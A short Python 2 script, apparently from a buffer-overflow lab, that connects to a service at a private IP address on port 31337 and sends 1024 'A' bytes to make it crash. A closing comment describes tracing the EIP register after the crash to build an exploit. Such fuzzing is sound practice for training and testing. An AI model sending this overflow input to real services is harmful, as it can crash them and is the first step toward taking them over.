#!/usr/bin/env python2
import socket

RHOST="192.168.2.211"
RPORT=31337

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf=""
buf+= "A"*1024
buf+="\n"

s.send(buf)

print("Send: {0}".format(buf))

data=s.recv(1024)
print("Received: {}".format(data))

#see where it crashes in the program to set breakpoints, trace back the last place you knoe with eip location after crash 
